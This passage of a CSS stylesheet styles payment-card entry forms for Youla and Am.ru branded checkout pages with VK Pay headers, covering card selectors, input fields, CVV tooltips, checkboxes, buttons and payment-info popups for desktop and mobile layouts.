.pay-card-layout__promo_type_youla-mobile .pay-card-layout__promo-column_type_right {
	width: 99%;
	padding-left: 0;
	font-size: 14px;
	color: #8f8f8f
}

.pay-card-layout_type_youla-mobile .pay-card-layout__header_type_vkpay {
	border-bottom: 1px solid #e1e3e5;
	background: #fff;
	position: relative;
	z-index: 105
}

.pay-card-layout_type_youla-mobile .pay-card-layout__header_type_vkpay .pay-card-layout__logo {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: 100%;
	max-width: 360px;
	margin: 0 auto;
	padding: 15px
}

.pay-card_type_youla {
	position: relative;
	width: 620px;
	margin: 0 auto;
	padding: 20px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-family: Roboto, arial, helvetica;
	font-size: 14px;
	line-height: 22px;
	-webkit-font-smoothing: antialiased
}

.pay-card_type_youla .pay-card__card-selector {
	width: auto;
	position: relative
}

.pay-card_type_youla .pay-card__card-selector.pay-card__card-selector_type_hidden {
	display: none!important
}

.pay-card_type_youla .pay-card__select-card {
	display: block
}

.pay-card_type_youla .pay-card__select-card .control {
	margin-right: 0
}

.pay-card_type_youla .pay-card__select-card .control__select {
	width: 260px;
	height: 40px;
	padding: 4px;
	margin: 0 0 10px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	border: 1px solid #e9e9e9;
	border-radius: 2px;
	background: #fff;
	font-size: 16px;
	color: #393939
}

.pay-card_type_youla .pay-card__select-card .control__select:hover {
	background: #f9f9f9
}

.pay-card_type_youla .pay-card__remove-card {
	position: absolute;
	right: 20px;
	top: 228px;
	margin: 0;
	color: #393939;
	font-size: 13px
}

.pay-card_type_youla .pay-card__remove-card:hover {
	color: #f75059
}

.pay-card_type_youla .pay-card__remove-card-text {
	position: relative;
	z-index: 2
}

.pay-card_type_youla .pay-card__card {
	width: auto
}

.pay-card_type_youla .credit-card-form__card-wrapper {
	position: relative;
	margin: 0 0 25px
}

.pay-card_type_youla .credit-card-form__form {
	padding: 0;
	text-align: left
}

.pay-card_type_youla .credit-card-form__card_position_back,
.pay-card_type_youla .credit-card-form__card_position_front {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: 350px;
	height: 213px;
	margin: 0;
	padding: 20px;
	float: none;
	background: #f9f9f9;
	border-radius: 5px;
	-webkit-box-shadow: none;
	box-shadow: none;
	border: 1px solid #ebebeb
}

.pay-card_type_youla .credit-card-form__card_position_front {
	z-index: 5;
	padding-top: 65px
}

.pay-card_type_youla .credit-card-form__card_position_back {
	z-index: 1;
	right: 0;
	float: right;
	margin: -213px 0 0
}

.pay-card_type_youla .credit-card-form__card_position_back:before {
	height: 40px;
	margin: -5px -20px 15px;
	background: #ebebeb
}

.pay-card_type_youla .payment-systems-icons {
	top: -50px
}

.pay-card_type_youla .payment-systems-icon {
	margin-left: 10px
}

.pay-card_type_youla .credit-card-form__label-group {
	margin: 0 0 15px
}

.pay-card_type_youla .credit-card-form__title {
	margin: 0 0 10px;
	text-transform: none;
	font-size: 12px;
	line-height: 12px;
	color: #8f8f8f
}

.pay-card_type_youla .credit-card-form__input {
	height: 32px;
	background: #fff;
	border-color: #ebebeb;
	border-radius: 2px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 14px;
	letter-spacing: 0;
	color: #393939;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_youla .credit-card-form__input:focus {
	-webkit-box-shadow: none;
	box-shadow: none;
	border-color: #00AD64
}

.pay-card_type_youla .credit-card-form__input::-webkit-input-placeholder {
	color: #8f8f8f
}

.pay-card_type_youla .credit-card-form__input:-moz-placeholder,
.pay-card_type_youla .credit-card-form__input::-moz-placeholder {
	color: #8f8f8f
}

.pay-card_type_youla .credit-card-form__input:-ms-input-placeholder {
	color: #8f8f8f
}

.pay-card_type_youla .credit-card-form__label-group_type_add-card {
	position: relative;
	top: -67px;
	right: 20px;
	margin: 0 0 -18px;
	text-align: right
}

.pay-card_type_youla .credit-card-form__label-group_type_add-card .credit-card-form__label {
	position: relative;
	z-index: 3;
	font-size: 13px;
	line-height: 18px;
	color: #393939
}

.pay-card_type_youla [type=checkbox]+.credit-card-form__input-icon {
	position: relative;
	top: -2px;
	display: inline-block;
	margin-right: 8px;
	vertical-align: top;
	width: 18px;
	height: 18px;
	border: 2px solid #bababa;
	border-radius: 2px;
	background: #f9f9f9;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_youla [type=checkbox]:checked+.credit-card-form__input-icon {
	background: #1287c9;
	border-color: #1287c9
}

.pay-card_type_youla [type=checkbox]:checked+.credit-card-form__input-icon:after {
	content: "";
	display: block;
	margin: auto;
	width: 5px;
	height: 9px;
	border: solid #fff;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg);
	-o-transform: rotate(45deg);
	transform: rotate(45deg)
}

.pay-card_type_youla .credit-card-form__label-group_type_expiration-date .credit-card-form__input,
.pay-card_type_youla .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	width: 100%;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	margin-left: 0
}

.pay-card_type_youla .credit-card-form__label-group_type_expiration-date,
.pay-card_type_youla .credit-card-form__label_type_cvv {
	width: 85px
}

.pay-card_type_youla .credit-card-form__label-group_type_cvv .credit-card-form__label,
.pay-card_type_youla .credit-card-form__label-group_type_expiration-date {
	margin: 0
}

.pay-card_type_youla .credit-card-form__label-group_type_holder-name {
	width: 210px;
	float: left
}

.pay-card_type_youla .credit-card-form__cvv-icon,
.pay-card_type_youla .credit-card-form__cvv-icon:hover,
.pay-card_type_youla .credit-card-form__label_type_cvv:hover .credit-card-form__cvv-icon {
	height: 15px;
	width: 15px
}

.pay-card_type_youla .credit-card-form__cvv-icon {
	position: absolute;
	display: inline-block;
	top: -2px;
	right: 0;
	padding: 2px 0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	border-radius: 15px;
	background-image: none;
	background-color: #8f8f8f;
	opacity: .6;
	text-align: center;
	color: #fff;
	cursor: pointer
}

.pay-card_type_youla .credit-card-form__cvv-icon:hover {
	opacity: 1
}

.pay-card_type_youla .credit-card-form__cvv-icon:before {
	display: inline-block;
	content: "?";
	font-size: 12px
}

.pay-card_type_youla .credit-card-form__terms {
	margin: 0 0 25px;
	font-size: 14px;
	line-height: 22x;
	color: #8f8f8f
}

.pay-card_type_youla .credit-card-form__terms-link {
	color: #1287c9;
	text-decoration: none
}

.pay-card_type_youla .credit-card-form__terms-link:hover {
	text-decoration: underline
}

.pay-card_type_youla .credit-card-form__label_error_yes .credit-card-form__title {
	color: #f75059
}

.pay-card_type_youla .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none;
	border-color: #f75059
}

.pay-card_type_youla .credit-card-form__submit {
	text-align: left
}

.pay-card-layout_type_youla .credit-card-form__popup .button,
.pay-card_type_youla .credit-card-form__submit .button {
	color: #fff;
	border-radius: 2px;
	background: #00ad64;
	padding: 0 45px;
	height: 40px;
	line-height: 40px;
	letter-spacing: .5px;
	font-size: 14px;
	font-weight: 500;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-family: Roboto, arial, helvetica
}

.pay-card-layout_type_youla .credit-card-form__popup .button:active,
.pay-card-layout_type_youla .credit-card-form__popup .button:hover,
.pay-card_type_youla .credit-card-form__submit .button:active,
.pay-card_type_youla .credit-card-form__submit .button:hover {
	background: #00ad64
}

.secure-information_type_youla {
	width: 620px;
	margin: -51px auto 0;
	padding: 0 50px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background: none;
	text-align: right;
	font-family: Roboto, arial, helvetica;
	-webkit-font-smoothing: antialiased
}

.secure-information_type_youla .secure-information__icon {
	margin: 0;
	width: 16px
}

.secure-information_type_youla .secure-information__text {
	position: relative;
	z-index: 2;
	margin: 0;
	font-size: 14px;
	line-height: 22px;
	color: #2a2a2a
}

.secure-information_type_youla .secure-information__text_type_protocol {
	display: inline-block;
	margin: 0 5px 0 0
}

.pay-card_type_youla .credit-card-form__tooltip {
	left: auto;
	right: 12px;
	top: 20px;
	width: 150px;
	color: #fff;
	background: rgba(0, 0, 0, .6);
	padding: 5px 15px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 12px;
	text-align: left;
	border-radius: 2px
}

.pay-card_type_youla .credit-card-form__tooltip-arrow {
	bottom: -20px;
	right: 10px;
	border: solid transparent;
	content: "";
	height: 0;
	width: 0;
	pointer-events: none;
	border-top-color: rgba(0, 0, 0, .6);
	border-width: 7px;
	margin-left: 0
}

.pay-card_type_youla .credit-card-form__popup-overlay {
	position: absolute;
	left: 0;
	top: 0;
	right: 0;
	bottom: 0;
	z-index: 100
}

.pay-card_type_youla .credit-card-form__error-text,
.pay-card_type_youla .credit-card-form__label-group_type_add-card .credit-card-form__input,
.pay-card_type_youla .credit-card-form__label_type_cvv .credit-card-form__error-text,
.pay-card_type_youla .credit-card-form__title_type_expiration-date,
.pay-card_type_youla .credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-icon,
.pay-card_type_youla .pay-card__remove-card-icon,
.pay-card_type_youla .pay-card__select-card .control-label__text {
	display: none
}

.credit-card-form__popup_type_youla,
.pay-card-layout_type_youla .credit-card-form__popup {
	z-index: 100;
	font-family: Roboto, arial, helvetica
}

.credit-card-form__popup_type_youla .info-block__img-wrapper,
.pay-card-layout_type_youla .credit-card-form__popup .info-block__img-wrapper {
	margin-bottom: 30px
}

.credit-card-form__popup_type_youla .notification-block .title,
.pay-card-layout_type_youla .credit-card-form__popup .notification-block .title {
	margin-bottom: 25px;
	color: #2a2a2a;
	font-size: 20px;
	line-height: 24px
}

.credit-card-form__popup_type_youla .notification-block .paragraph,
.pay-card-layout_type_youla .credit-card-form__popup .notification-block .paragraph {
	margin-bottom: 30px;
	font-size: 14px;
	line-height: 22px;
	color: #8f8f8f
}

.pay-card-layout_type_youla .credit-card-form__popup .payment-info-table__caption {
	width: 335px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	padding: 20px;
	border: 1px solid #ebebeb;
	border-bottom: 0;
	background-color: #fff
}

.pay-card-layout_type_youla .credit-card-form__popup .payment-info-table {
	width: 335px;
	border: 1px solid #ebebeb;
	border-top: 0;
	background-color: #fff
}

.pay-card-layout_type_youla .credit-card-form__popup .payment-info-table__caption,
.pay-card-layout_type_youla .credit-card-form__popup .payment-info-table__cell,
.pay-card-layout_type_youla .credit-card-form__popup .payment-info-table__head {
	font-size: 14px;
	color: #2a2a2a
}

.pay-card-layout_type_youla .credit-card-form__popup .payment-info-table__head {
	padding: 0 0 15px 10px
}

.pay-card-layout_type_youla .credit-card-form__popup .payment-info-table__cell {
	padding: 0 10px 15px 0;
	color: #8f8f8f
}

.pay-card-layout_type_youla .credit-card-form__popup .payment-info-table .grid-table__row:last-child .payment-info-table__cell,
.pay-card-layout_type_youla .credit-card-form__popup .payment-info-table .grid-table__row:last-child .payment-info-table__head {
	padding-bottom: 25px
}

.control__select_type_youla-selectBox-dropdown-menu {
	background: #fff;
	border: 1px solid #e9e9e9;
	border-radius: 2px;
	-webkit-box-shadow: none;
	box-shadow: none
}

.control__select_type_youla-selectBox-dropdown-menu.selectBox-options li:last-child {
	border-top: 1px solid #ebebeb
}

.control__select_type_youla-selectBox-dropdown-menu.selectBox-options li a {
	line-height: 35px;
	padding: 0 20px;
	font-size: 14px
}

.control__select_type_youla-selectBox-dropdown-menu.selectBox-options li a:hover {
	background: #f5f5f5
}

.control__select_type_youla-selectBox-dropdown-menu.selectBox-options li.selectBox-selected a {
	background: #f5f5f5;
	color: #393939
}

.control__select_type_youla .selectBox-label {
	display: block!important;
	padding: 5px 15px!important;
	font-size: 14px
}

.control__select_type_youla.selectBox-dropdown.selectBox-menuShowing.selectBox-menuShowing-bottom .selectBox-label {
	color: #00AD64
}

.pay-card-layout_type_youla .pay-card-layout__header_type_vkpay {
	border-bottom: 1px solid #e9e9e9;
	z-index: 101;
	position: relative
}

.pay-card-layout_type_youla .pay-card-layout__header_type_vkpay .pay-card-layout__logo {
	width: 620px;
	margin: 0 auto;
	padding: 20px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card-layout_type_youla .credit-card-form__popup_type_static {
	position: static
}

.pay-card_type_amru {
	position: relative;
	width: 620px;
	margin: 0 auto;
	padding: 20px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-family: Roboto, arial, helvetica;
	font-size: 14px;
	line-height: 22px;
	-webkit-font-smoothing: antialiased
}

.pay-card_type_amru .pay-card__card-selector {
	width: auto;
	position: relative
}

.pay-card_type_amru .pay-card__select-card {
	display: block
}

.pay-card_type_amru .pay-card__select-card .control {
	margin-right: 0
}

.pay-card_type_amru .pay-card__select-card .control__select {
	width: 260px;
	height: 40px;
	padding: 4px;
	margin: 0 0 10px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	border: 1px solid #e9e9e9;
	border-radius: 2px;
	background: #fff;
	font-size: 16px;
	color: #393939
}

.pay-card_type_amru .pay-card__select-card .control__select:hover {
	background: #f9f9f9
}

.pay-card_type_amru .pay-card__remove-card {
	position: absolute;
	right: 20px;
	top: 228px;
	margin: 0;
	color: #393939;
	font-size: 13px
}

.pay-card_type_amru .pay-card__remove-card:hover {
	color: #d53536
}

.pay-card_type_amru .pay-card__remove-card-text {
	position: relative;
	z-index: 2
}

.pay-card_type_amru .pay-card__card {
	width: auto
}

.pay-card_type_amru .credit-card-form__card-wrapper {
	position: relative;
	margin: 0
}

.pay-card_type_amru .credit-card-form__form {
	padding: 0;
	text-align: left
}

.pay-card_type_amru .credit-card-form__card_position_back,
.pay-card_type_amru .credit-card-form__card_position_front {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: 350px;
	height: 213px;
	margin: 0;
	padding: 20px;
	float: none;
	background: #f9f9f9;
	border-radius: 5px;
	-webkit-box-shadow: none;
	box-shadow: none;
	border: 1px solid #ebebeb
}

.pay-card_type_amru .credit-card-form__card_position_front {
	z-index: 5;
	padding-top: 65px
}

.pay-card_type_amru .credit-card-form__card_position_back {
	z-index: 1;
	right: 0;
	float: right;
	margin: -213px 0 0
}

.pay-card_type_amru .credit-card-form__card_position_back:before {
	height: 40px;
	margin: -5px -20px 15px;
	background: #ebebeb
}

.pay-card_type_amru .payment-systems-icons {
	top: -50px
}

.pay-card_type_amru .payment-systems-icon {
	margin-left: 10px
}

.pay-card_type_amru .credit-card-form__label-group {
	margin: 0 0 15px
}

.pay-card_type_amru .credit-card-form__title {
	margin: 0 0 10px;
	text-transform: none;
	font-size: 12px;
	line-height: 12px;
	color: #8f8f8f
}

.pay-card_type_amru .credit-card-form__input {
	height: 32px;
	background: #fff;
	border-color: #ebebeb;
	border-radius: 2px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 14px;
	letter-spacing: 0;
	color: #393939;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_amru .credit-card-form__input:disabled {
	opacity: .8
}

.pay-card_type_amru .credit-card-form__input:focus {
	-webkit-box-shadow: none;
	box-shadow: none;
	border-color: #5993da
}

.pay-card_type_amru .credit-card-form__input::-webkit-input-placeholder {
	color: #8f8f8f
}

.pay-card_type_amru .credit-card-form__input:-moz-placeholder,
.pay-card_type_amru .credit-card-form__input::-moz-placeholder {
	color: #8f8f8f
}

.pay-card_type_amru .credit-card-form__input:-ms-input-placeholder {
	color: #8f8f8f
}

.pay-card_type_amru .credit-card-form__label-group_type_add-card {
	position: relative;
	top: -42px;
	right: 20px;
	margin: 0 0 -18px;
	text-align: right
}

.pay-card_type_amru .credit-card-form__label-group_type_add-card .credit-card-form__label {
	position: relative;
	z-index: 3;
	color: #393939
}

.pay-card_type_amru [type=checkbox]+.credit-card-form__input-icon {
	position: relative;
	top: -2px;
	display: inline-block;
	margin-right: 8px;
	vertical-align: top;
	width: 18px;
	height: 18px;
	border: 2px solid #bababa;
	border-radius: 2px;
	background: #f9f9f9;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_amru [type=checkbox]:checked+.credit-card-form__input-icon {
	background: #1287c9;
	border-color: #1287c9
}

.pay-card_type_amru [type=checkbox]:checked+.credit-card-form__input-icon:after {
	content: "";
	display: block;
	margin: auto;
	width: 5px;
	height: 9px;
	border: solid #fff;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg);
	-o-transform: rotate(45deg);
	transform: rotate(45deg)
}

.pay-card_type_amru .credit-card-form__label-group_type_expiration-date .credit-card-form__input,
.pay-card_type_amru .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	width: 100%;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	margin-left: 0
}

.pay-card_type_amru .credit-card-form__label-group_type_expiration-date {
	float: none
}

.pay-card_type_amru .credit-card-form__label-group_type_expiration-date,
.pay-card_type_amru .credit-card-form__label_type_cvv {
	width: 85px
}

.pay-card_type_amru .credit-card-form__label-group_type_cvv .credit-card-form__label,
.pay-card_type_amru .credit-card-form__label-group_type_expiration-date {
	margin: 0
}

.pay-card_type_amru .credit-card-form__label-group_type_holder-name {
	width: 210px;
	float: left
}

.pay-card_type_amru .credit-card-form__cvv-icon,
.pay-card_type_amru .credit-card-form__cvv-icon:hover,
.pay-card_type_amru .credit-card-form__label_type_cvv:hover .credit-card-form__cvv-icon {
	height: 15px;
	width: 15px
}

.pay-card_type_amru .credit-card-form__cvv-icon {
	position: absolute;
	display: inline-block;
	top: -2px;
	right: 0;
	padding: 2px 0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	border-radius: 15px;
	background-image: none;
	background-color: #8f8f8f;
	background-position: 0;
	opacity: .6;
	text-align: center;
	color: #fff;
	cursor: pointer
}

.pay-card_type_amru .credit-card-form__cvv-icon:hover {
	opacity: 1
}

.pay-card_type_amru .credit-card-form__cvv-icon:before {
	display: inline-block;
	content: "?";
	font-size: 12px
}

.pay-card_type_amru .credit-card-form__terms {
	margin-top: 25px;
	font-size: 14px;
	line-height: 22x;
	color: #8f8f8f
}

.pay-card_type_amru .credit-card-form__terms-link {
	color: #5993da;
	text-decoration: none
}

.pay-card_type_amru .credit-card-form__terms-link:hover {
	color: #d53536
}

.pay-card_type_amru .credit-card-form__label_error_yes .credit-card-form__title {
	color: #f75059
}

.pay-card_type_amru .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none;
	border-color: #f75059
}

.pay-card_type_amru .credit-card-form__submit {
	text-align: left
}

.pay-card_type_amru .credit-card-form__popup .button,
.pay-card_type_amru .credit-card-form__submit .button {
	color: #fff;
	border-radius: 2px;
	background: #87bc3f;
	padding: 0 45px;
	height: 40px;
	line-height: 40px;
	letter-spacing: .5px;
	font-size: 14px;
	font-weight: 500;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_amru .credit-card-form__popup .button:active,
.pay-card_type_amru .credit-card-form__popup .button:hover,
.pay-card_type_amru .credit-card-form__submit .button:active,
.pay-card_type_amru .credit-card-form__submit .button:hover {
	background: #6fa32b
}

.secure-information_type_amru {
	width: 620px;
	margin: -51px auto 0;
	padding: 0 50px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background: none;
	text-align: right
}

.secure-information_type_amru .secure-information__icon {
	margin: 0
}

.secure-information_type_amru .secure-information__text {
	position: relative;
	z-index: 2;
	margin: 0;
	font-size: 14px;
	line-height: 22px;
	color: #2a2a2a
}

.secure-information_type_amru .secure-information__text_type_protocol {
	display: inline-block;
	margin: 0 5px 0 0
}

.pay-card_type_amru .credit-card-form__tooltip {
	left: auto;
	right: 12px;
	top: 20px;
	width: 150px;
	color: #fff;
	background: rgba(0, 0, 0, .6);
	padding: 5px 15px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 12px;
	text-align: left;
	border-radius: 2px
}

.pay-card_type_amru .credit-card-form__tooltip-arrow {
	bottom: -20px;
	right: 10px;
	border: solid transparent;
	content: "";
	height: 0;
	width: 0;
	pointer-events: none;
	border-top-color: rgba(0, 0, 0, .6);
	border-width: 7px;
	margin-left: 0
}

.pay-card_type_amru .credit-card-form__popup-overlay {
	position: absolute;
	left: 0;
	top: 0;
	right: 0;
	bottom: 0;
	z-index: 100
}

.pay-card_type_amru .credit-card-form__error-text,
.pay-card_type_amru .credit-card-form__label-group_type_add-card .credit-card-form__input,
.pay-card_type_amru .credit-card-form__label_type_cvv .credit-card-form__error-text,
.pay-card_type_amru .credit-card-form__title_type_expiration-date,
.pay-card_type_amru .credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-icon,
.pay-card_type_amru .pay-card__remove-card-icon,
.pay-card_type_amru .pay-card__select-card .control-label__text {
	display: none
}

.credit-card-form__popup_type_amru,
.pay-card_type_amru .credit-card-form__popup {
	z-index: 100
}

.credit-card-form__popup_type_amru .info-block__img-wrapper,
.pay-card_type_amru .credit-card-form__popup .info-block__img-wrapper {
	margin-bottom: 30px
}

.credit-card-form__popup_type_amru .notification-block .title,
.pay-card_type_amru .credit-card-form__popup .notification-block .title {
	margin-bottom: 25px;
	color: #2a2a2a;
	font-size: 20px;
	line-height: 24px
}

.credit-card-form__popup_type_amru .notification-block .paragraph,
.pay-card_type_amru .credit-card-form__popup .notification-block .paragraph {
	margin-bottom: 30px;
	font-size: 14px;
	line-height: 22px;
	color: #8f8f8f
}

.pay-card_type_amru .credit-card-form__popup .payment-info-table__caption {
	width: 335px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	padding: 20px;
	border: 1px solid #ebebeb;
	border-bottom: 0;
	background-color: #fff
}

.pay-card_type_amru .credit-card-form__popup .payment-info-table {
	width: 335px;
	border: 1px solid #ebebeb;
	border-top: 0;
	background-color: #fff
}

.pay-card_type_amru .credit-card-form__popup .payment-info-table__caption,
.pay-card_type_amru .credit-card-form__popup .payment-info-table__cell,
.pay-card_type_amru .credit-card-form__popup .payment-info-table__head {
	font-size: 14px;
	color: #2a2a2a
}

.pay-card_type_amru .credit-card-form__popup .payment-info-table__head {
	padding: 0 0 15px 25px
}

.pay-card_type_amru .credit-card-form__popup .payment-info-table__cell {
	padding: 0 25px 15px 0;
	color: #8f8f8f
}

.pay-card_type_amru .credit-card-form__popup .payment-info-table .grid-table__row:last-child .payment-info-table__cell,
.pay-card_type_amru .credit-card-form__popup .payment-info-table .grid-table__row:last-child .payment-info-table__head {
	padding-bottom: 25px
}

.control__select_type_amru-selectBox-dropdown-menu {
	background: #fff;
	border: 1px solid #e9e9e9;
	border-radius: 2px;
	-webkit-box-shadow: none;
	box-shadow: none
}

.control__select_type_amru-selectBox-dropdown-menu.selectBox-options li:last-child {
	border-top: 1px solid #ebebeb
}

.control__select_type_amru-selectBox-dropdown-menu.selectBox-options li a {
	line-height: 35px;
	padding: 0 20px;
	font-size: 14px
}

.control__select_type_amru-selectBox-dropdown-menu.selectBox-options li a:hover {
	background: #f5f5f5
}

.control__select_type_amru-selectBox-dropdown-menu.selectBox-options li.selectBox-selected a {
	background: #f5f5f5;
	color: #393939
}

.control__select_type_amru .selectBox-label {
	display: block!important;
	padding: 5px 15px!important;
	font-size: 14px
}

.control__select_type_amru.selectBox-dropdown.selectBox-menuShowing.selectBox-menuShowing-bottom .selectBox-label {
	color: #5993da
}

.pay-card_type_amru-mobile {
	position: static;
	width: 100%;
	max-width: 360px;
	margin: 0 auto;
	padding: 5px 15px 15px;
	font-family: Roboto, arial, helvetica;
	font-size: 15px;
	color: #8f8f8f;
	-webkit-font-smoothing: antialiased
}

.pay-card_type_amru-mobile,
.pay-card_type_amru-mobile .pay-card-layout__column {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_amru-mobile .pay-card-layout__column_type_left,
.pay-card_type_amru-mobile .pay-card-layout__column_type_right {
	float: left
}

.pay-card_type_amru-mobile .pay-card-layout__icon {
	display: inline-block;
	margin-right: 10px
}

.pay-card_type_amru-mobile .pay-card-layout__sum,
.pay-card_type_amru-mobile .pay-card-layout__title {
	margin: 0;
	padding: 0;
	font-size: 15px;
	line-height: 20px
}

.pay-card_type_amru-mobile .pay-card-layout__title {
	color: #777272
}

.pay-card_type_amru-mobile .pay-card-layout__sum {
	color: #222;
	font-weight: 700
}

.pay-card_type_amru-mobile .pay-card__card-selector {
	position: relative;
	width: auto;
	margin: 0
}

.pay-card_type_amru-mobile .pay-card__select-card {
	display: block
}

.pay-card_type_amru-mobile .pay-card__select-card .control {
	margin-right: 0
}

.pay-card_type_amru-mobile .pay-card__select-card .control__select {
	width: 100%;
	height: 38px;
	padding: 10px;
	margin: 0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	border-radius: 2px;
	background: #fff;
	font-family: Roboto, arial, helvetica;
	font-size: 15px;
	color: #222;
	border-color: #d9d9d9;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_amru-mobile .pay-card__card-selector:before {
	position: absolute;
	content: "";
	background: #fff;
	top: 41px;
	right: 10px;
	width: 9px;
	height: 9px;
	border: solid #d9d9d9;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg);
	-o-transform: rotate(45deg);
	transform: rotate(45deg);
	pointer-events: none
}

.pay-card_type_amru-mobile .pay-card__remove-card {
	display: inline-block;
	margin: 0;
	color: #5993da;
	font-size: 14px;
	margin-top: 5px
}

.pay-card_type_amru-mobile .pay-card__card {
	width: auto
}

.pay-card_type_amru-mobile .pay-card__card_type_added-card {
	padding-top: 0
}

.pay-card_type_amru-mobile .pay-card__card_type_added-card .credit-card-form__label-group_type_add-card,
.pay-card_type_amru-mobile .pay-card__card_type_added-card .credit-card-form__label-group_type_card-number {
	display: none
}

.pay-card_type_amru-mobile .pay-card__card_type_added-card .payment-systems-icons {
	top: -100px
}

.pay-card_type_amru-mobile .pay-card__card_type_added-card .credit-card-form__tooltip {
	top: -48px
}

.pay-card_type_amru-mobile .pay-card__message {
	text-align: left
}

.pay-card_type_amru-mobile .credit-card-form__card-wrapper {
	position: relative
}

.pay-card_type_amru-mobile .credit-card-form__form {
	padding: 0;
	text-align: left
}

.pay-card_type_amru-mobile .credit-card-form__card_position_front {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: auto;
	height: auto;
	margin: 10px auto 0;
	padding: 0;
	background: none;
	border-radius: 0;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_amru-mobile .payment-systems-icons {
	position: absolute;
	right: 0;
	top: 3px
}

.pay-card_type_amru-mobile .payment-systems-icon {
	margin: 0 0 0 5px;
	float: right
}

.pay-card_type_amru-mobile .credit-card-form__label-group_type_card-number {
	margin: 0 0 10px
}

.pay-card_type_amru-mobile .control-label__text,
.pay-card_type_amru-mobile .credit-card-form__title {
	display: block;
	margin: 0 0 6px;
	text-transform: none;
	color: #777272;
	line-height: 1.57;
	font-size: 15px
}

.pay-card_type_amru-mobile .credit-card-form__input {
	height: 38px;
	background: #fff;
	border-color: #d9d9d9;
	color: #5993da;
	border-radius: 4px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none;
	font-size: 15px;
	padding-left: 10px
}

.pay-card_type_amru-mobile .credit-card-form__input::-webkit-input-placeholder {
	color: #777272;
	text-transform: none;
	letter-spacing: .5px;
	font-size: 14px
}

.pay-card_type_amru-mobile .credit-card-form__input::-moz-placeholder {
	color: #777272;
	text-transform: none;
	letter-spacing: .5px;
	font-size: 14px
}

.pay-card_type_amru-mobile .credit-card-form__input::placeholder {
	color: #777272;
	text-transform: none;
	letter-spacing: .5px;
	font-size: 14px
}

.pay-card_type_amru-mobile .credit-card-form__input:focus {
	-webkit-box-shadow: none;
	box-shadow: none;
	border-color: #5993da
}

.pay-card_type_amru-mobile .credit-card-form__input:disabled {
	color: #777272;
	opacity: 1;
	-webkit-text-fill-color: #777272
}

.pay-card_type_amru-mobile .credit-card-form__label-group_type_add-card {
	position: relative;
	z-index: 2;
	top: -210px;
	margin: 0 0 -22px
}

.pay-card_type_amru-mobile .credit-card-form__label-group_type_add-card .credit-card-form__label {
	font-size: 15px
}

.pay-card_type_amru-mobile .credit-card-form__label-group_type_add-card .credit-card-form__input {
	display: none
}

.pay-card_type_amru-mobile [type=checkbox]+.credit-card-form__input-icon {
	display: inline-block;
	margin: -3px 10px 0 0;
	padding: 3px;
	vertical-align: top;
	width: 14px;
	height: 14px;
	border: 1px solid #e1e3e5;
	border-radius: 4px;
	background: #fff
}

.pay-card_type_amru-mobile [type=checkbox]:checked+.credit-card-form__input-icon {
	border-color: #d9d9d9
}

.pay-card_type_amru-mobile [type=checkbox]:checked+.credit-card-form__input-icon:after {
	content: "";
	display: block;
	margin: auto;
	width: 5px;
	height: 9px;
	border: solid #00AD64;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg);
	-o-transform: rotate(45deg);
	transform: rotate(45deg)
}

.pay-card_type_amru-mobile .credit-card-form__title_type_expiration-date {
	display: none
}

